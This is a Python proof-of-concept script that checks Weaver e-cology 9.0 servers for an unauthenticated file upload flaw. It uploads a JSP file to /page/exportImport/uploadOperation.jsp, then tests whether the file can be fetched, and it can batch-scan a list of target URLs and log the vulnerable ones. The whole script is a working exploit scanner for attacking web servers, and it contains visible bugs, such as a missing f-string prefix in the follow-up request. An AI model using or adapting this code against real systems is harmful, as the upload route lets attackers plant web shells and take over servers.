#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, time, re, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：e-cology9.0".center(40))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(40))
    print("")
    print('*'.center(60, '*'))
    print("")

class ecology9_fileUpload_POC():
    def ecology9_fileUpload_Check(self, url):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        target_url = f"{url}/page/exportImport/uploadOperation.jsp"
        headers = {
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo",
            "Connection": "close"
        }
        payload = '''------WebKitFormBoundaryFy3iNVBftjP6IOwo
Content-Disposition: form-data; name="file"; filename="atest.jsp"
Content-Type: application/octet-stream

out.print("afeicome");
------WebKitFormBoundaryFy3iNVBftjP6IOwo--'''
        try:
            requests.post(target_url, headers=headers, data=payload, verify=False, timeout=2)
            try:
                data = requests.get("{url}/page/exportImport/fileTransfer/atest.jsp").text
                res = re.search(r"afeicome", data).group()
                if res == "afeicome":
                    print(f"\033[31m[+] {url}存在文件上传漏洞！")
                    with open("e-cology9_vuln.txt", "a+") as f:
                        f.writelines(url + "\n")
            except Exception as e:
                print(f"[n] {url}不存在该漏洞。")
                return url
        except Exception as e:
            print(f"[n] {url}请求失败！")
            return url

    def ecology9_fileUpload_Batch_Check(self, url, file):
        if url:
            return True
        elif file:
            for url in file:
                url = url.replace('\n', '')
                time.sleep(1)
                self.ecology9_fileUpload_Check(url)

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="ecology9 fileUpload POC")
    parser.add_argument(
        '-u', '--url', type=str,
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'),
        help='Please input urls file path. eg: c:\\urls.txt'
    )
    args = parser.parse_args()
    run_POC=ecology9_fileUpload_POC()
    if args.file:
        run_POC.ecology9_fileUpload_Batch_Check(args.url, args.file)
        print("\n[done] 批量探测完成，请查看：e-cology9_vuln.txt")
    if args.url:
        run_POC.ecology9_fileUpload_Check(args.url)